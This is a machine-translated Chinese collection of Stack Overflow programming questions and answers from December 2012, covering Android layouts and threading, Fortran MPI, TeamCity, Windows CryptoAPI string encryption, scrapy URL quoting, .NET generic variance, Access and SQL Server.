> 赞同：1
> 
> 时间：2012-12-11T15:06:57.510
> 
> 标签：android, xml, android-layout

我的问题是我似乎无法让我的菜单布局正常工作。到目前为止，我已经尝试使用 LayoutWeight 来尝试让 ImageButton 使用一定数量的空间，但我似乎无法让它工作，并且前两个和后两个 ImageButton 之间存在很大差距。

下面是一个非常快速的线框链接，我希望布局看起来像这样，下面是我目前拥有的代码，没有底部的 TextView。

我不确定这是否是一个专门的编程问题，但我正在寻找有关布局的有用资源，关于我应该为代码的某些部分查看什么的建议，或者可以做我想做的/非常事情的代码相似的。

任何和所有的帮助表示赞赏，谢谢。

**我的快速线框图上的快速注释**-

我基本上希望徽标占据垂直像素/屏幕的 10%，方形图像每行占据 35%，因此总体上占 70%。剩下的 20% 分配给底部的 TextView。

![图像](../Images/42c7b9d9b2ed2b05c27ee4de0535df19.png)

```
 <?xml version="1.0" encoding="utf-8"?>
    <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:background="@drawable/bg_image"
    >

    <ImageView
        android:id="@+id/imageView1"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:src="@drawable/logo_hb" 
        />    
    <LinearLayout  android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:orientation="horizontal"
        android:weightSum="100">

    <ImageView
        android:id="@+id/imageButton1"        
        android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_gravity="right"
        android:src="@drawable/imagebutton1"
        android:layout_weight="50"
        />

    <ImageView
        android:id="@+id/imageButton2"
        android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_gravity="left"
        android:src="@drawable/imagebutton2" 
        android:layout_weight="50"
        />

    </LinearLayout>
<LinearLayout  android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:orientation="horizontal"
        android:weightSum="100"
        >
    <ImageView
        android:id="@+id/imageButton3"
        android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_gravity="right"
        android:src="@drawable/imagebutton3"
        android:layout_weight="50" 
        />

    <ImageView
        android:id="@+id/imageButton4"
        android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_gravity="right"
        android:src="@drawable/imagebutton4"
        android:layout_weight="50" 
        />

    </LinearLayout>

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:23:49.987

添加`android:weightSum="100"`到您的主`LinearLayout`布局，然后通过指定为其子布局指定所需的权重`android:layout_weight="weight_value"`。

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"    
    android:weightSum="100">

<ImageView
    android:id="@+id/imageView1"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:src="@drawable/ic_launcher" 
    android:layout_weight="10"/>    

<LinearLayout
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:orientation="horizontal"
    android:weightSum="100"
    android:layout_weight="35" >

<ImageView
    android:id="@+id/imageButton1"
    android:layout_width="0dp"
    android:layout_height="match_parent"
    android:layout_gravity="right"
    android:layout_weight="50"
    android:src="@drawable/ic_launcher" />

<ImageView
    android:id="@+id/imageButton2"
    android:layout_width="0dp"
    android:layout_height="match_parent"
    android:layout_gravity="left"
    android:layout_weight="50"
    android:src="@drawable/ic_launcher" />

</LinearLayout>

<LinearLayout
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:orientation="horizontal"
    android:weightSum="100" 
    android:layout_weight="35">

<ImageView
    android:id="@+id/imageButton3"
    android:layout_width="0dp"
    android:layout_height="match_parent"
    android:layout_gravity="right"
    android:layout_weight="50"
    android:src="@drawable/ic_launcher" />

<ImageView
    android:id="@+id/imageButton4"
    android:layout_width="0dp"
    android:layout_height="match_parent"
    android:layout_gravity="right"
    android:layout_weight="50"
    android:src="@drawable/ic_launcher" />

</LinearLayout>

<TextView
    android:id="@+id/textView1"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:layout_weight="20"
    android:text="TextView" />

</LinearLayout> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T15:51:57.443

最简单的方法是使用相对布局而不是线性布局。只需将您需要的控件放到设计师那里，然后将它们锚定在正确的位置。唯一的一个问题是强迫你的正方形 vievs 正方形。可能您必须制作自己的控件并覆盖它的 onMeasure() 方法以设置高度等于宽度。

# c - 非持久数据的 Fortran/MPI 非阻塞发送

> ID：13822565
> 
> 赞同：0
> 
> 时间：2012-12-11T15:07:02.993
> 
> 标签：c, fortran, mpi

考虑以下：

```
subroutine send_to_friend(a,b,c,request)
  implicit none
  include 'mpif.h'  !use mpi if you've built the mpif90 bindings...

  real a,b,c
  real buff(3)
  integer tag,dest,ierr,request

  tag = 50
  dest = 0

  buff(1) = a
  buff(2) = b
  buff(3) = c
  call MPI_Isend(buff,3,MPI_REAL,dest,tag,MPI_COMM_WORLD,request,ierr)
return
end subroutine send_to_friend 
```

这可能不起作用，因为`buff`它将被放入堆栈（无论如何使用大多数现代编译器），但只要子例程退出，它就会被清除干净。分配数组也无济于事，因为根据[此处](http://www.nsc.liu.se/~boein/f77to90/a3.html)（第 10 节），当您退出过程时，分配的数组会自动解除分配——在 C 中，这将是内存泄漏（也很糟糕）。做这样的事情的正确方法是什么？`save`我应该用属性声明数组吗？（`static`在 C 中）。这种设计一开始就存在缺陷吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:48:32.663

`SAVE` should be fine (best combine with allocatable), provided you do not come to other problems, which would require Fortran to pass the array via copy-in copy-out, it has to be done by reference (do not try to send non-contiguous data using nonblocking MPI).

If you have `save` variables in the routine, also do not try to run it from more threads, if you combine MPI/OpenMP.

# android - 如何在 android 的第二个活动中读取 HTML 文件？

> ID：13822567
> 
> 赞同：0
> 
> 时间：2012-12-11T15:07:07.087
> 
> 标签：android

嗨，我正在编写应用程序来打开 HTML file.so 进行初始活动，我在 AndroidManifest 文件中提到

```
 <data android:mimeType="text/html" /> 
```

在活动中，我使用以下代码获取 HTML 文件的 URI。

```
 Uri mDataUri = = getIntent().getData(); 
```

然后通过使用以下代码，我正在使用以下代码读取 HTML 文件的数据

```
 ContentResolver cr = getContentResolver();
        InputStream input = cr.openInputStream(mDataUri); 
```

从 InputStream 我正在解析数据并获取内容。

但是现在客户想要中间的启动画面，所以如果我读取 SplashScrren 中的数据，我无法发送到 SecondScreen，因为该文件内容更多（转换为字符串长度后为：3,00,000）。

现在相同的 HTML 如何在第二个屏幕中阅读？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:30:53.273

您不需要在`AndroidManifest.xml`. 如果您将 HTML 文件放在`asset`项目的文件夹中，您将能够在任何活动中使用该类[`AssetManager`](http://developer.android.com/reference/android/content/res/AssetManager.html)提供的内容：`Application`

`AssetManager assetMgr = getApplication().getAssets();`

您可以通过获取以下内容获得相同的`input`值`InputStream`：

`InputStream input = assetMgr.open("nameOfFile.html");`

如果您将内容放在 WebView 中，您可以按名称加载文件：

`WebView webView = new Webview(context);`

`webView.loadUrl("file:///android_asset/nameOfFile.html");`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-29T07:18:25.593

当我们将 MimeTypes 设置为 text/html 的活动时，您只能读取该活动中的数据，不能从另一个活动中读取数据，因此您可以在本地存储并在第二个活动中访问。

# continuous-integration - TeamCity - 如何将一个输出 dll 发布到多个目录中？

> ID：13822569
> 
> 赞同：0
> 
> 时间：2012-12-11T15:07:18.913
> 
> 标签：continuous-integration, teamcity

我正在尝试将输出 dll 之一发布到多个工件目录。但似乎，teamcity 仅将该 dll 发布到最后一个目录。

我想要这样的东西：

```
MyTool\MyTool.dll =>  MyZip.zip!/MyTool1/
MyTool\MyTool.dll =>  MyZip.zip!/MyTool2/ 
```

并在输出：

```
MyZip.zip
    MyTool1/MyTool.dll
    MyTool2/MyTool.dll 
```

但是 TeamCity 只返回最后一行：

```
MyZip.zip
    MyTool2/MyTool.dll 
```

有谁知道如何将一个 dll 从构建输出发布到多个工件目录？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:32:25.237

我花了一些时间寻找解决方法。似乎 zip 文件是症结所在。如果它*不需要*被压缩，那么以下工作正常：

```
MyTool\MyTool.dll =>  MyTool/MyTool1/
MyTool\MyTool.dll =>  MyTool/MyTool2/ 
```

另一种选择是创建一个构建步骤，将 DLL 移动到所需的文件夹结构中，然后将该文件夹保存为压缩的工件。

# java - Android Runnable 降低我的设备速度

> ID：13822572
> 
> 赞同：2
> 
> 时间：2012-12-11T15:07:23.790
> 
> 标签：java, android, multithreading, runnable

我正在尝试开发一个从 HTML 网页获取一些数据并每秒显示一次的应用程序。

为此，我以这种方式使用可运行对象：

在 OnCreate() 方法中：

```
mHandler.removeCallbacks(mMuestraMensaje);
mHandler.postDelayed(mMuestraMensaje, 5000); 
```

然后是另一种方法：

```
 private Runnable mMuestraMensaje = new Runnable() {
        public void run() {

           try {
            returned = test.GetSensorData(newString);
            rowTextView.setText(returned);
        } catch (Exception e) {
            e.printStackTrace();
        }
           mHandler.removeCallbacks(mMuestraMensaje);
           mHandler.postDelayed(this, 500);
        }
      }; 
```

问题是，例如，如果我按下后退按钮，应用程序开始运行缓慢，直到我不强制关闭整个应用程序，设备运行速度太慢！

谢谢！

编辑

这是整个班级：

```
public class HttpExample extends Title {

GetMethodEx test, moredata ;
String returned;
TextView rowTextView, rowTextView2;
LinearLayout ll;
private Handler mHandler = new Handler();
String newString;

@Override
protected void onCreate(Bundle savedInstanceState) {
    // TODO Auto-generated method stub
    super.onCreate(savedInstanceState);
    setContentView(R.layout.httpexample);
    rowTextView = (TextView)findViewById(R.id.textView2);
    rowTextView2 = (TextView)findViewById(R.id.textView1);

    mHandler.removeCallbacks(mMuestraMensaje);
    mHandler.postDelayed(mMuestraMensaje, 5000);

    Bundle extras = getIntent().getExtras();
    newString = extras.getString("STRING_I_NEED");

    test = new GetMethodEx();
    moredata = new GetMethodEx();

    try {
        String name = moredata.GetName(newString);
        rowTextView2.setText(name);

    } catch (Exception e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }

    ScheduledExecutorService executor =
            Executors.newSingleThreadScheduledExecutor();

        executor.scheduleAtFixedRate(mMuestraMensaje , 0, 500, TimeUnit.MILLISECONDS );

}

    private Runnable mMuestraMensaje = new Runnable() {
        public void run() {

           try {
              returned = test.GetSensorData(newString);
           } catch (Exception e) {
              e.printStackTrace();
           }
           MainActivity.this.runOnUiThread(new Runnable(){
                 rowTextView.setText(returned);
           });
        }
      }; 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:14:42.403

您的程序变慢了，因为您在 GUI 线程上运行线程。不建议这样做。但是，我注意到您在完成后正在设置文本。这是您可以做的几件事。

1.  在不同的线程中运行传感器数据收集。`runOnUiThread`通过命令更新文本。
2.  使用[`AsyncTask`](http://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&ved=0CDMQFjAA&url=http://developer.android.com/reference/android/os/AsyncTask.html&ei=8k3HUMrtFaT-0gHn_YHwCg&usg=AFQjCNE8gLVXz1Hwq4rI8oxRkZNHjhRzpQ&sig2=EGsfg74aNijlfw52vnBHDA&bvm=bv.1354675689,d.dmQ)，这似乎是一个理想的情况。
3.  对于这种不需要 UI 线程的常规事件，我建议使用[ScheduledExecutorService](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/concurrent/ScheduledExecutorService.html)。

最简单的开始是第一个，但我会仔细研究第二个选项。第一个选项是这样的：（注意，您需要将 MainActivity 替换为您的活动名称）

```
ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);

executor.scheduleAtFixedRate(mMuestraMensaje , 0, 500, TimeUnit.MILLISECONDS );

private Runnable mMuestraMensaje = new Runnable() {
    public void run() {

       try {
          returned = test.GetSensorData(newString);
       } catch (Exception e) {
          e.printStackTrace();
       }
       MainActivity.this.runOnUiThread(new Runnable(){
             rowTextView.setText(returned);
       });
    }
  }; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T18:54:55.390

让它与这个一起工作：

```
private Runnable mMuestraMensaje = new Runnable() {
    public void run() {

        try {
              returned = test.GetSensorData(newString);

           } catch (Exception e) {
              e.printStackTrace();
           }

        HttpExample.this.runOnUiThread(new Runnable(){

            @Override
            public void run() {
                // TODO Auto-generated method stub
                rowTextView.setText(returned.get(0)+returned.get(1));
                rowTextView2.setText(returned.get(2));

            }

       });

    }

    }; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-11T15:17:44.337

您可以`Handler`使用`HandlerThread`. 例如：

```
HandlerThread ht = new HandlerThread("nonUiThread");
ht.start();
Handler mHandler = new Handler(ht.getLooper()); 
```

但更可取的是，我建议您`AsyncTask`在您的情况下使用。

# php - 我想更改 PDF 的大小？

> ID：13822574
> 
> 赞同：0
> 
> 时间：2012-12-11T15:06:37.217
> 
> 标签：php, pdf, phantomjs

我正在使用 Phantom js 在我的应用程序中创建 pdf（使用导出模型 toPDF()），现在 PDF 工作正常。但是我的 CGridview 被分成两页，看起来不太好。所以我想改变PDF的大小。

我搜索了可用的选项，我得到了（https://github.com/ariya/phantomjs/wiki/API-Reference）一些属性，如此页面中的纸张大小。但这在我的页面上不起作用。

我尝试更改导出模型中的路径变量，并添加了 size 属性。它也不起作用。我需要一些解决方案来更改 PDF 的大小。

# c++ - 使用加密解密期间丢失的字符

> ID：13822575
> 
> 赞同：1
> 
> 时间：2012-12-11T15:06:39.590
> 
> 标签：c++, encryption

我正在使用“wincrypt.h”来基于算法来加密字符串，然后将加密的字符串解密为原始字符串。

就像是 ：

```
Original -> Encrypt -> Decrypt -> Original 
```

问题是在某些情况下（某些单词），解密的原件长度很短，问题不是我检查过的字符串长度或一个或多个相关字符。我认为问题在于密钥（它只是一个随机字符串），如果我使用不同的密钥，它会影响完全不同的单词/字符串。

这是代码：

```
 BOOL SetupCryptoClient()
    {
        // Ensure that the default cryptographic client is set up.  
        HCRYPTPROV hProv;
        HCRYPTKEY hKey;     
        // Attempt to acquire a handle to the default key container.
        if (!CryptAcquireContext(&hProv, NULL, MS_DEF_PROV, PROV_RSA_FULL, 0))  
        {
            // Some sort of error occured, create default key container.
            if (!CryptAcquireContext(&hProv, NULL, MS_DEF_PROV, PROV_RSA_FULL, CRYPT_NEWKEYSET))
            {   
                // Error creating key container!            
                return FALSE;       
            }   
        }
        // Attempt to get handle to signature key.
        if (!CryptGetUserKey(hProv, AT_SIGNATURE, &hKey))   
        {
            if (GetLastError() == NTE_NO_KEY)       
            {           
                // Create signature key pair.
                if (!CryptGenKey(hProv, AT_SIGNATURE, 0, &hKey))            
                {
                    // Error during CryptGenKey!                
                    CryptReleaseContext(hProv, 0);
                    return FALSE;           
                }           
                else            
                {               
                    CryptDestroyKey(hKey);          
                }       
            }       
            else        
            {
                // Error during CryptGetUserKey!            
                CryptReleaseContext(hProv, 0);
                return FALSE;       
            }   
        }

        // Attempt to get handle to exchange key.
        if (!CryptGetUserKey(hProv,AT_KEYEXCHANGE,&hKey))   
        {
            if (GetLastError()==NTE_NO_KEY)     
            {           
                // Create key exchange key pair.
                if (!CryptGenKey(hProv,AT_KEYEXCHANGE,0,&hKey))         
                {
                    // Error during CryptGenKey!                
                    CryptReleaseContext(hProv, 0);
                    return FALSE;           
                }           
                else            
                {               
                    CryptDestroyKey(hKey);          
                }       
            }       
            else        
            {
                // Error during CryptGetUserKey!            
                CryptReleaseContext(hProv, 0);
                return FALSE;       
            }   
        }   

        CryptReleaseContext(hProv, 0);  
        return TRUE;
    }

    BOOL EncryptString(TCHAR* szPassword,TCHAR* szEncryptPwd,TCHAR *szKey)
    {   
        BOOL bResult = TRUE;    
        HKEY hRegKey = NULL;    
        HCRYPTPROV hProv;   
        HCRYPTKEY hKey;
        HCRYPTKEY hXchgKey; 
        HCRYPTHASH hHash;   
        DWORD dwLength;
        // Get handle to user default provider.
        if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, 0))  
        {
            // Create hash object.      
            if (CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash))     
            {
                // Hash password string.            
                dwLength = sizeof(TCHAR)*_tcslen(szKey);
                if (CryptHashData(hHash, (BYTE *)szKey, dwLength, 0))           
                {
                    // Create block cipher session key based on hash of the password.
                    if (CryptDeriveKey(hProv, MY_ENCRYPT, hHash, CRYPT_EXPORTABLE, &hKey))              
                    {
                        // Determine number of bytes to encrypt at a time.
                        dwLength = sizeof(TCHAR)*_tcslen(szPassword);                   
                        // Allocate memory.
                        BYTE *pbBuffer = (BYTE *)malloc(dwLength);                  
                        if (pbBuffer != NULL)                   
                        {
                            memcpy(pbBuffer, szPassword, dwLength);                     
                            // Encrypt data
                            if (CryptEncrypt(hKey, 0, TRUE, 0, pbBuffer, &dwLength, dwLength))                      
                            {
                                // return encrypted string
                                memcpy(szEncryptPwd, pbBuffer, dwLength);

                            }   
                            else                        
                            {                           
                                bResult = FALSE;                        
                            }                       
                            // Free memory
                            free(pbBuffer);                 
                        }
                        else                    
                        {                       
                            bResult = FALSE;                    
                        }
                        CryptDestroyKey(hKey);  // Release provider handle.             
                    }               
                    else                
                    {
                        // Error during CryptDeriveKey!                 
                        bResult = FALSE;                
                    }           
                }           
                else            
                {
                    // Error during CryptHashData!              
                    bResult = FALSE;            
                }
                CryptDestroyHash(hHash); 
                // Destroy session key.     
            }       
            else        
            {
                // Error during CryptCreateHash!            
                bResult = FALSE;        
            }
            CryptReleaseContext(hProv, 0);  
        }   
        return bResult;
    }

    BOOL DecryptString(TCHAR* szEncryptPwd,TCHAR* szPassword,TCHAR *szKey) 
    {   
        BOOL bResult = TRUE;    
        HCRYPTPROV hProv;       
        HCRYPTKEY hKey;     
        HCRYPTKEY hXchgKey;
        HCRYPTHASH hHash;
        TCHAR szPasswordTemp[32] = _T("");
        DWORD dwLength;
        // Get handle to user default provider.
        if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, 0))      
        {
            // Create hash object.          
            if (CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash))
            {               
                // Hash password string.
                dwLength = sizeof(TCHAR)*_tcslen(szKey);
                if (CryptHashData(hHash, (BYTE *)szKey, dwLength, 0))               
                {
                    // Create block cipher session key based on hash of the password.
                    if (CryptDeriveKey(
                        hProv, MY_ENCRYPT, hHash, CRYPT_EXPORTABLE, &hKey))                 
                    {
                        // we know the encrypted password and the length
                        dwLength = sizeof(TCHAR)*_tcslen(szEncryptPwd);                     
                        // copy encrypted password to temporary TCHAR
                        _tcscpy(szPasswordTemp,szEncryptPwd);
                        if (!CryptDecrypt(
                                hKey, 0, TRUE, 0, (BYTE *)szPasswordTemp, &dwLength))
                            bResult = FALSE;                        
                        CryptDestroyKey(hKey);  // Release provider handle.                 
                        // copy decrypted password to outparameter
                        _tcscpy(szPassword,szPasswordTemp);
                    }                   
                    else                    
                    {
                        // Error during CryptDeriveKey!                     
                        bResult = FALSE;                    
                    }               
                }               
                else
                {                   
                    // Error during CryptHashData!                  
                    bResult = FALSE;                
                }
                CryptDestroyHash(hHash); // Destroy session key.            
            }           
            else            
            {
                // Error during CryptCreateHash!                
                bResult = FALSE;            
            }
            CryptReleaseContext(hProv, 0);      
        }       
        return bResult;
    } 
```

这就是我所说的：

```
TCHAR szEncrypt[32] = _T("");
EncryptString( myString, szEncrypt, szKey );

TCHAR szDecrypt[32] = _T("");
DecryptString( szEncrypt, szDecrypt, szKey); 
```

*注意：代码不是我的。*

**编辑：使用键“Mz6@a0i*”将 Kolaris 转换为 Kolari**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T19:51:15.910

加密的字符串可以包含一个零字节，实际上任何单个字节为零的机会是 1/256。您假设加密结果是一个以零字节结尾的字符串。即使 TCHAR 是 16 位而不是 8 位，您的机会仍然是 1/65536。

您需要传递加密结果的长度。

# ruby-on-rails - 使用 Passenger 运行多个 Rails 应用程序

> ID：13822576
> 
> 赞同：2
> 
> 时间：2012-12-11T15:07:29.807
> 
> 标签：ruby-on-rails, nginx, passenger

我使用Passenger 作为nginx 中rails 应用程序的应用程序服务器。是否可以使用单个Passenger 实例运行多个rails 应用程序？

谢谢你

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-05T11:42:46.410

是的，您绝对可以在 Phusion Passenger 上运行多个应用程序。请记住，根据 Phusion Passenger 文档，您应该设置一个具有特定域名的虚拟主机，然后将该虚拟主机的文档指向应用程序的“公共”目录的根目录？嗯...如果你想部署更多的应用程序，你做*同样的事情*。您添加更多虚拟主机，并在其他虚拟主机中指向其他应用程序的“公共”目录。

# java - 尝试设置图像字段时出现 iText 错误

> ID：13822577
> 
> 赞同：-2
> 
> 时间：2012-12-11T15:07:30.400
> 
> 标签：java, itext

我正在使用 iText 5.3.4 并尝试设置图像字段，下面的代码是 Bruno 建议我使用的，但是我收到“表达式的类型必须是数组类型但它解析为列表”的错误。我没有看到有关如何按照 api 要求的方式编写代码的文档。有没有人知道这应该怎么写？？？？或者如何将图像发送到图像字段？

```
Rectangle rect = form.getFieldPositions(fieldName)[0].position;
int page = form.getFieldPositions(fieldName)[0].page;
image1.scaleAbsolute(rect.getWidth(), rect.getHeight());
img.setAbsolutePosition(rect.getLeft(), rect.getBottom());
stamper.getOverContent(page).addImage(img); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T16:01:27.180

return from`getFieldPositions`是 type [`List<AcroFields.FieldPosition>`](http://api.itextpdf.com/itext/com/itextpdf/text/pdf/AcroFields.html#getFieldPositions%28java.lang.String%29)，所以投诉是有效的。您应该使用`.get(0)`而不是`[0]`引用集合中的第一项。

一个简单的重构可能是：

```
List<AcroFields.FieldPosition> positions = form.getFieldPositions(fieldName);
Rectangle rect = positions.get(0).position;
int page = positions.get(0).page;
image1.scaleAbsolute(rect.getWidth(), rect.getHeight());
img.setAbsolutePosition(rect.getLeft(), rect.getBottom());
stamper.getOverContent(page).addImage(img); 
```

# python - 我如何使用scrapy shell来处理url上的参数

> ID：13822582
> 
> 赞同：5
> 
> 时间：2012-12-11T15:07:41.533
> 
> 标签：python, django, scrapy

我想废弃招聘网站。我想在scrapy shell中做一些测试。

因此，如果我输入这个

`scrapy shell http://www.seek.com.au`

然后如果我输入

`from scrapy.contrib.linkextractors.sgml import SgmlLinkExtractor`

然后它工作正常

但如果我这样做

```
scrapy shell http://www.seek.com.au/JobSearch?DateRange=31&SearchFrom=quick&Keywords=python&nation=3000 
```

然后如果我输入

`from scrapy.contrib.linkextractors.sgml import SgmlLinkExtractor`

然后它说无效`from`的bash命令并退出scrapy作业并作为已停止的作业出现在屏幕上

```
>>> from scrapy.contrib.linkextractors.sgml import SgmlLinkExtractor
-bash: from: command not found

[5]+  Stopped                 scrapy shell http://www.seek.com.au/JobSearch?DateRange=31
[7]   Done                    Keywords=php 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-11T15:37:25.230

显然，您需要用双引号将您的网址括起来：

```
scrapy shell "http://www.seek.com.au/JobSearch?DateRange=31&SearchFrom=quick&Keywords=python&nation=3000"
>>> from scrapy.contrib.linkextractors.sgml import SgmlLinkExtractor
>>> lx = SgmlLinkExtractor() 
```

然后一切顺利（上面是我的实际shell输出）

在没有双引号的情况下尝试过，不起作用（提取线程继续运行，第一次按键退出到 bash 而不改变我的视觉输出，因此给了我同样的错误）

# c# - 切换帧后的 System.ArgumentNullException（Windows 应用商店应用程序）

> ID：13822583
> 
> 赞同：1
> 
> 时间：2012-12-11T15:07:44.550
> 
> 标签：c#, .net, windows-store-apps

*我想通过在Windows Store App*的两个框架之间传递数据来进行简单的导航。

当我从 MainPage 开始时，导航到 BlankPage

```
 private void goTo_BlankPage()
    {
        this.Frame.Navigate(typeof(BlankPage),multimedia);
    } 
```

然后我使用 BackButton：

```
<Button x:Name="backButton" Click="GoBack" IsEnabled="{Binding Frame.CanGoBack, ElementName=pageRoot}" Style="{StaticResource BackButtonStyle}"/> 
```

一切顺利。

但是当我添加：

```
protected override void OnNavigatedTo(NavigationEventArgs e){} 
```

到 BlankPage （所以我可以处理传递的数据），然后尝试从它返回，我得到`System.ArgumentNullException`.

可能有什么问题？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-11T15:09:31.170

试试这个

调用`base.OnNavigatedTo`覆盖的`OnNavigatedTo`方法。

应用程序必须在返回时可能需要的基本方法中执行某些操作

# c# - 将 List(of List(of MyType)) 转换为 IEnumerable(of IEnumerable(of MyType))

> ID：13822586
> 
> 赞同：1
> 
> 时间：2012-12-11T15:07:54.303
> 
> 标签：c#, vb.net, .net-3.5, generic-collections, generic-variance

我有一个接受类型参数的方法`IEnumerable(Of IEnumerable(Of MyType))`

如果我执行以下操作：

```
Dim list1 as new List(Of MyType) From { obj1, obj2 }
Dim list2 as new List(Of MyType) From { obj3, obj4 }

MyMethod({ list1, list2 }) 
```

有用。

如果我通过 a`List(Of List(Of MyType))`它编译但给出*运行时错误*，如下所示：

```
System.InvalidCastException: Unable to cast object of type
'System.Collections.Generic.List`1[System.Collections.Generic.List`1[MyType]]' to type
'System.Collections.Generic.IEnumerable`1[System.Collections.Generic.IEnumerable`1[MyType]]' 
```

如果我通过`MyType()()`它会给出*编译时错误*，如下所示：

```
Value of type '2-dimensional array of MyType' cannot be converted to
'System.Collections.Generic.IEnumerable(Of System.Collections.Generic.IEnumerable(Of MyType))' 
```

我目前正在使用.net 3.5。

这似乎是一个类似于[Casting List<MyObject> to IEnumerable<MyInterface>](https://stackoverflow.com/questions/2050457/casting-listmyobject-to-ienumerablemyinterface)的问题，我听说在 .net 4 中已解决。

有什么想法可以避免这个错误吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T23:33:01.460

发生运行时错误，因为直到 .NET 4 才引入对通用接口的方差支持。 [http://msdn.microsoft.com/en-us/library/dd233059.aspx](http://msdn.microsoft.com/en-us/library/dd233059.aspx)

一些选项：您可以升级到 4（显然）。

您可以将签名更改`MyMethod`为 always expect `List(Of List(Of T))`。

您可以编写一个扩展方法来`List(Of List(Of T))`将`IEnumerable(Of IEnumerable(Of T))`. 但是，您可能希望在 C# 程序集中执行此操作，因此您可以利用`yield return`. 我想不出在 VB.Net 中处理它的好方法。

诀窍是将需要从 List 隐式转换为 IEnumerable 的泛型维数降至 1。3.5 框架可以处理泛型类型的 1 维的隐式转换，但不能像您的示例中那样处理 2 维。

下面的例子：

3.5 C#项目：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace ConsoleApplication2Helpers
{
    public static class My35Extensions
    {   
        public static  IEnumerable<IEnumerable<T>> ToIEnumerableOfIEnumerable<T>(this List<List<T>> value)
        {
            foreach (var v1 in value)
            {
                yield return v1;
            }
        }
    }
} 
```

3.5 VB.Net 项目基于您的原始示例：

```
Imports System.Collections.Generic
Imports System.Linq
Imports System.Runtime.CompilerServices
Imports ConsoleApplication2Helpers.My35Extensions

Module Module1

    Sub Main()
        Dim obj1 As New MyType, obj2 As New MyType, obj3 As New MyType, obj4 As New MyType
        Dim list1 As New List(Of MyType) From {obj1, obj2}
        Dim list2 As New List(Of MyType) From {obj3, obj4}
        Dim arg1 = {list1, list2}

        ' Works in 3.5 and 4\.  The non-generic array can be implicitly converted to IEnumerable.
        ' Then the framework only has one more dimension for the second IEnumerable conversion.
        ' The single dimension can convert implicitly in .NET 3.5 or 4.
        MyMethod(arg1)

        Dim arg2 As New List(Of List(Of MyType))
        arg2.Add(list1)
        arg2.Add(list2)

        ' Works in .NET 4 but NOT 3.5 because .NET Framework 4 introduces variance support for several existing generic interfaces.
        'MyMethod(arg2)

        ' Works in .NET 4 or 3.5.
        ' Uses custom extension method to implicitly convert the outer List<T> to IEnumerable<T>, so we can run in .NET 3.5.
        MyMethod(arg2.ToIEnumerableOfIEnumerable())

        Console.ReadKey()
    End Sub

    Sub MyMethod(value As IEnumerable(Of IEnumerable(Of MyType)))
        '
    End Sub

End Module

Public Class MyType
    Public Sub New()

    End Sub
End Class 
```

# ms-access - Access 中的 ConcatRelated()，使用两个键

> ID：13822588
> 
> 赞同：1
> 
> 时间：2012-12-11T15:08:03.810
> 
> 标签：ms-access, concatenation

我找到了 ConcatRelated() 函数 [http://allenbrowne.com/func-concat.html]，它似乎可以做我想做的事，但我需要输入两个键而不是一个键。

我的数据看起来像：

```
Chain    Store      Warehouse
Walmart  Tucson     Phoenix
Walmart  Tucson     Flagstaff
Walmart  Phoenix    Phoenix
Bi-Lo    Phoenix    Phoenix
Bi-Lo    Phoenix    Flagstaff 
```

我需要基于链和商店连接：

```
Chain    Store      Warehouses
Walmart  Tucson     Phoenix, Flagstaff
Walmart  Phoenix    Phoenix
Bi-Lo    Phoenix    Phoenix, Flagstaff 
```

你能帮我解决我需要在括号内使用的论点吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T15:22:20.367

你可以这样写：

```
SELECT Distinct
  tbl.Chain,
  tbl.Store,
  ConcatRelated("Warehouse","tbl","Chain=""" & [Chain] & """ and Store=""" & [Store] & """") AS Warehouses
FROM tbl; 
```

# sql - Order By 子句没有正确排序

> ID：13822590
> 
> 赞同：0
> 
> 时间：2012-12-11T15:08:08.187
> 
> 标签：sql, sql-server, sql-server-2008, tsql

这是我在安静的一段时间里遇到的最有趣的问题之一。我在 SQL Server 2008 中定义了一个标量函数，它的返回类型是`varchar(max)`

这是查询：

```
 Select dbo.GetJurisdictionsSubscribed(u.UserID) as 'Jurisdiction' From Users u ORDER BY Jurisdiction desc 
```

